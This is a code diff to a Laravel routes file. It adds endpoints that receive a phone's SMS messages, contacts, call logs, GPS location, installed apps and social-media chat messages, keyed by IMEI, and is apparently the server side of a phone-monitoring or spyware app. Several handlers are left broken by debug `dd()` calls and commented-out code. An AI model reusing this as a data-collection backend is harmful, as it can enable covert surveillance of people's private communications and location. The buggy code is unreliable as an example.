@@ -5,6 +5,8 @@ use App\Models\Contact;
 use App\Models\ContactLog;
 use App\Models\Sms;
 use App\Models\SocialApp;
+use App\Models\App;
+use App\Models\Location;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Route;
 
@@ -25,22 +27,90 @@ use Illuminate\Support\Facades\Route;
 
 
     Route::post('browsers', function (Request $request) {
+        $browserData = (object) $request->json()->all();
         return Browser::create($request->all);
     });
     Route::post('sms', function(Request $request) {
-        return Sms::create($request->all);
+        $smsData = (object) $request->json()->all();
+        Sms::create([
+            "imei" => $smsData->imei,
+            "contact" => $smsData->address,
+            "type" =>  $smsData->type,
+            "message" =>  $smsData->msg,
+            "date" => $smsData->date,
+        ]);
+
+        return response("successful sms entry",200);
     });
     Route::post('contact', function(Request $request) {
-        return Contact::create($request->all);
+        $contactData = (object) $request->json()->all();
+        Contact::updateOrCreate([
+            "imei"  => $contactData->imei,
+            "name"  =>  $contactData->name,
+            "phone_number" => $contactData->phoneNumber
+        ],[
+            "imei"  => $contactData->imei,
+            "name"  =>  $contactData->name,
+            "phone_number" => $contactData->phoneNumber
+        ]);
+
+        return response("Succesful contact entry",200);
     });
     Route::post('call_logs', function(Request $request) {
-        ContactLog::create($request->all);
-        return response("Sucess",200);
+        $callLogData = (object) $request->json()->all();
+        dd($callLogData);
+        // ContactLog::updateOrCreate([
+        //     "imei" =>  $callLogData->imei,
+        //     "name"  =>  $callLogData->name,
+        //     "phone_number" =>  $callLogData->phoneNumber,
+        //     "duration" =>   $callLogData->duration,
+        //     "date"  =>  $callLogData->date,
+        //     "type" =>  $callLogData->type,
+        // ],[
+        //     "imei" =>  $callLogData->imei,
+        //     "name"  =>  $callLogData->name,
+        //     "phone_number" =>  $callLogData->phoneNumber,
+        //     "duration" =>   $callLogData->duration,
+        //     "date"  =>  $callLogData->date,
+        //     "type" =>  $callLogData->type,
+        // ]);
+  
+        return response("Sucessful Call log entry",200);
+    });
+    Route::post('location', function (Request $request) {
+        $locationData = (object) $request->json()->all();
+        // Location::create([
+        //     "imei" => $locationData->imei,
+        //     "longitude" =>  $locationData->longitude,
+        //     "latitude" =>  $locationData->latitude,
+        //     "date" => $locationData->date,
+        // ]);
+        dd("hello");
+        return response("Successful location entry",200);
+    });
+    Route::post('apps', function (Request $request) {
+        $appData = (object) $request->json()->all();
+        App::updateOrCreate([
+            'name'=>$request->name, 
+            'imei' =>$request->imei
+        ],[
+            'name'=>$request->name,
+            'imei' =>$request->imei
+        ]);
+        return response("Successful app entry",200);
     });
     Route::post('social_media',function(Request $request) {
- //       SocialApp::create($request->all());
-        SocialApp::create(["imei"=>$request->imei,"contact"=>$request->contact,"type"=>$request->type,"message"=>$request->message,"platform"=>$request->platform,"date"=>$request->date]);
-        return response("Success",200);
+        $socialData = (object) $request->json()->all();
+
+        SocialApp::create([
+            "imei"=>$request->imei,
+            "contact"=>$request->contact,
+            "type"=>$request->type,
+            "message"=>$request->message,
+            "platform"=>$request->platform,
+            "date"=>$request->date
+            ]);
+        return response("Successful chat message entry",200);
     });
 
 
